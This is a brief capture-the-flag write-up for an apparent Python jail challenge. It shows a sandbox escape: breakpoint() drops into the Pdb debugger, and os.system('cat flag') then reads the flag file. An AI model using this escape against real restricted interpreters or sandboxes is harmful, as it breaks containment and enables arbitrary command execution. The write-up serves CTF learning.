Many solutions. An easy one:

```py
>>> breakpoint()
--Return--
> <string>(1)<module>()->None
(Pdb) import os; os.system('cat flag')
uoftctf{you_got_out_of_jail_free}
0
(Pdb)
```